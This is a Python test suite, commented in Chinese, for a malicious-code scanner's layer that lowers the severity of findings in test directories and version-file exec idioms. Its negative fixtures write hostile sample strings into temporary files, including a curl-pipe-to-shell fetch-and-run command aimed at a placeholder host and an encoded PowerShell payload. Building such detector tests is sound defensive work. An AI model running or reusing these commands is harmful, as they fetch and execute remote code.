# -*- coding: utf-8 -*-
"""良性上下文判定测试（2026-11 机械降权层）

覆盖：
  1. is_fixture_path      测试/示例/文档目录识别
  2. is_version_idiom     版本检测惯用法（真读目标文件 + AST 内容检查）
  3. apply()              降权入口（critical→medium / →low，标记可见）
  4. partitioner 集成     降权后组仍产出（不丢可见性）
"""
import shutil
import sys
import tempfile
from pathlib import Path

NEW_DDG = Path(__file__).parent.parent
sys.path.insert(0, str(NEW_DDG))

from src.benign_context import (is_fixture_path, is_version_idiom, apply)

PASS = FAIL = 0


def check(name, cond, detail=''):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  ✓ {name}")
    else:
        FAIL += 1
        print(f"  ✗ {name}  {detail}")


print("[1] is_fixture_path")
check("tests/ 目录", is_fixture_path("pkg/tests/test_info_type_utils.py"))
check("tests 单数", is_fixture_path("pkg/test/foo.py"))
check("examples/", is_fixture_path("pkg/examples/demo.py"))
check("docs/", is_fixture_path("pkg/docs/guide.py"))
check("benchmarks/", is_fixture_path("pkg/benchmarks/b.py"))
check("源码目录不命中", not is_fixture_path("pkg/adbc_driver_sqlite/_version.py"))
check("子串不误命中（contest≠test）",
      not is_fixture_path("pkg/contest/run.py"))
check("空路径", not is_fixture_path(""))
check("Windows 反斜杠", is_fixture_path("pkg\\tests\\x.py"))

print("[2] is_version_idiom")
root = Path(tempfile.mkdtemp(prefix='bctx_'))
try:
    pkg = root / 'pkg'
    pkg.mkdir(parents=True)

    # --- 正例 1：setuptools-scm 标准形态 ---
    (pkg / '_version.py').write_text(
        '# This file is generated by versioningit\n'
        '__version__ = "1.11.0"\n'
        '__version_tuple__ = (1, 11, 0)\n', encoding='utf-8')
    code1 = ("with open(os.path.join(package_root, '_version.py'), 'rb') as f:\n"
             "    exec(f.read(), {}, version_info)")
    check("exec(f.read()) + 纯版本文件 → 是", is_version_idiom(code1, pkg))

    # --- 正例 2：exec(open(X).read()) ---
    (pkg / 'version.py').write_text('__version__ = "2.0"\n', encoding='utf-8')
    code2 = "exec(open('version.py').read())"
    check("exec(open(X).read()) → 是", is_version_idiom(code2, pkg))

    # --- 正例 3：os.path.join 形态 ---
    code3 = "exec(open(os.path.join(here, 'version.py')).read())"
    check("os.path.join 形态 → 是", is_version_idiom(code3, pkg))

    # --- 反例 1：目标文件含 import/call ---
    (pkg / 'evil_version.py').write_text(
        'import os\n'
        '__version__ = "1.0"\n'
        'os.system("curl http://x/y.sh | sh")\n', encoding='utf-8')
    code4 = "exec(open('evil_version.py').read())"
    check("目标文件有 os.system → 否", not is_version_idiom(code4, pkg))

    # --- 反例 2：目标文件含 def ---
    (pkg / 'ver_fn.py').write_text(
        'def _get():\n    return "1"\n__version__ = _get()\n', encoding='utf-8')
    check("目标文件有 def → 否", not is_version_idiom("exec(open('ver_fn.py').read())", pkg))

    # --- 反例 3：目标文件不存在 ---
    check("目标文件不存在 → 否",
          not is_version_idiom("exec(open('nope.py').read())", pkg))

    # --- 反例 4：非 exec 形状 ---
    check("普通 open 不判", not is_version_idiom("data = open('version.py').read()", pkg))
    check("空代码", not is_version_idiom("", pkg))

    # --- 反例 5：赋值目标不是版本变量 ---
    (pkg / 'weird.py').write_text('PAYLOAD = "powershell -EncodedCommand x"\n',
                                  encoding='utf-8')
    check("目标文件赋值非版本变量 → 否",
          not is_version_idiom("exec(open('weird.py').read())", pkg))

    # --- 路径 2：adbc_driver_sqlite 形态（open 与 exec 分属不同节点）---
    (pkg / '_version.py').write_text(
        'STATIC_VERSION_FILE = "_static_version_file.py"\n'
        'def get_static_version_info(version_file=STATIC_VERSION_FILE):\n'
        '    version_info = {}\n'
        '    with open(version_file, "rb") as f:\n'
        '        exec(f.read(), {}, version_info)\n'
        '    return version_info\n'
        '__version__ = get_version()\n', encoding='utf-8')
    code_adbc = "exec(f.read(), {}, version_info)"
    check("路径2: _version.py 内 exec(f.read()) → 是",
          is_version_idiom(code_adbc, pkg, node_file='pkg/_version.py'))
    check("路径2: 普通文件内同形状 → 否",
          not is_version_idiom(code_adbc, pkg, node_file='pkg/core.py'))

    # 路径 2 反例：模板文件里出现网络/进程 API
    (pkg / 'version.py').write_text(
        'import subprocess\n'
        'def _v(f):\n'
        '    exec(f.read())\n', encoding='utf-8')
    check("路径2: 模板文件含 subprocess → 否",
          not is_version_idiom("exec(f.read())", pkg, node_file='pkg/version.py'))

    # --- 路径 3：oauth2-client 形态（500+500 FP 驱动）---
    (pkg / 'setup.py').write_text(
        "__version__ = None\n"
        "version_file = 'pkg/__init__.py'\n"
        "with open(version_file, 'r') as f:\n"
        "    for line in f.readlines():\n"
        "        if line.find('__version__') >= 0:\n"
        "            exec(line)\n", encoding='utf-8')
    check("路径3: setup.py 逐行 exec 版本行 → 是",
          is_version_idiom("exec(line)", pkg, node_file='setup.py'))
    check("路径3: 节点带缩进也能匹配",
          is_version_idiom("            exec(line)", pkg, node_file='setup.py'))
    check("路径3: exec('常量') 不匹配",
          not is_version_idiom("exec('x')", pkg, node_file='setup.py'))

    (pkg / 'setup_evil.py').write_text(
        "import subprocess\n"
        "with open('v') as f:\n"
        "    for line in f.readlines():\n"
        "        exec(line)\n", encoding='utf-8')
    check("路径3: 容器含 subprocess → 否",
          not is_version_idiom("exec(line)", pkg, node_file='setup_evil.py'))

    (pkg / 'setup_plain.py').write_text(
        "with open('v') as f:\n"
        "    for line in f.readlines():\n"
        "        exec(line)\n", encoding='utf-8')
    check("路径3: 无 __version__ 过滤 → 否",
          not is_version_idiom("exec(line)", pkg, node_file='setup_plain.py'))
finally:
    shutil.rmtree(root, ignore_errors=True)

print("[3] apply() 降权入口")
try:
    import networkx as nx
    root2 = Path(tempfile.mkdtemp(prefix='bctx2_'))
    try:
        pkg2 = root2 / 'pkg'
        pkg2.mkdir(parents=True)
        (pkg2 / '_version.py').write_text('__version__ = "1.0"\n', encoding='utf-8')
        (pkg2 / 'tests').mkdir()
        (pkg2 / 'tests' / 'helper.py').write_text('x = 1\n', encoding='utf-8')

        g = nx.DiGraph()
        # tests/ 里的 critical
        g.add_node('pkg_tests_helper_py_5_0', file='pkg/tests/helper.py',
                   line=5, source="subprocess.run('ls')", type='call')
        # 版本惯用法 critical
        g.add_node('pkg__version__py_8_0', file='pkg/__init__.py',
                   line=8, source="exec(open('_version.py').read())", type='call')
        # 普通 critical（不受影响）
        g.add_node('pkg_core_py_9_0', file='pkg/core.py',
                   line=9, source="os.system(cmd)", type='call')

        sus = {
            'pkg_tests_helper_py_5_0': {'severity': 'critical',
                                        'category': 'command_execution',
                                        'file': 'pkg/tests/helper.py',
                                        'label': "subprocess.run('ls')"},
            'pkg__version__py_8_0': {'severity': 'critical',
                                     'category': 'code_execution',
                                     'file': 'pkg/__init__.py',
                                     'label': "exec(open('_version.py').read())"},
            'pkg_core_py_9_0': {'severity': 'critical',
                                'category': 'command_execution',
                                'file': 'pkg/core.py',
                                'label': "os.system(cmd)"},
        }
        stats = apply(sus, graph=g, project_dir=pkg2)
        check("fixture 降权 1 个", stats['fixture_downgraded'] == 1,
              detail=str(stats))
        check("版本惯用法 1 个", stats['version_idiom'] == 1,
              detail=str(stats))
        check("tests/ critical→medium",
              sus['pkg_tests_helper_py_5_0']['severity'] == 'medium')
        check("版本惯用法→low",
              sus['pkg__version__py_8_0']['severity'] == 'low')
        check("普通 critical 不动",
              sus['pkg_core_py_9_0']['severity'] == 'critical')
        check("标记写入节点 attrs",
              g.nodes['pkg_tests_helper_py_5_0'].get('benign_context') == 'fixture_dir'
              and g.nodes['pkg__version__py_8_0'].get('benign_context') == 'version_file')

        # --- 无 project_dir：只做 fixture 降权 ---
        sus2 = {'a': {'severity': 'critical', 'file': 'pkg/tests/x.py',
                      'label': 'exec(1)'}}
        stats2 = apply(sus2, graph=None, project_dir=None)
        check("无 project_dir 时 fixture 仍降权",
              stats2['fixture_downgraded'] == 1 and
              sus2['a']['severity'] == 'medium')
    finally:
        shutil.rmtree(root2, ignore_errors=True)
except ImportError as e:
    check("networkx 可用", False, detail=str(e))

print("[4] partitioner 集成（降权后组仍产出）")
try:
    import networkx as nx
    from src.common import GraphPartitioner, PartitionConfig
    root3 = Path(tempfile.mkdtemp(prefix='bctx3_'))
    try:
        pkg3 = root3 / 'pkg'
        (pkg3 / 'tests').mkdir(parents=True)
        (pkg3 / 'tests' / 't.py').write_text('x = 1\n', encoding='utf-8')

        g3 = nx.DiGraph()
        g3.add_node('tests_t_py_5_0', file='pkg/tests/t.py', line=5,
                    type='call', source="os.system('id')",
                    function_name='t')
        g3.add_node('tests_t_py_6_0', file='pkg/tests/t.py', line=6,
                    type='variable', source='id', function_name='t')
        g3.add_edge('tests_t_py_5_0', 'tests_t_py_6_0', edge_kind='data')

        p = GraphPartitioner(g3, PartitionConfig(verbose=False),
                             project_dir=pkg3)
        check("tests/ 节点降到 medium",
              p.suspicious_nodes['tests_t_py_5_0']['severity'] == 'medium',
              detail=str(p.suspicious_nodes.get('tests_t_py_5_0')))
        blocks = p.partition(method='function')
        check("降权后组仍产出（可见性保留）", len(blocks) == 1,
              detail=str(len(blocks)))
        check("组 severity=medium",
              blocks[0]['severity'] == 'medium')
    finally:
        shutil.rmtree(root3, ignore_errors=True)
except ImportError as e:
    check("networkx 可用", False, detail=str(e))


print()
print(f"良性上下文: PASS={PASS} FAIL={FAIL}")
sys.exit(1 if FAIL else 0)
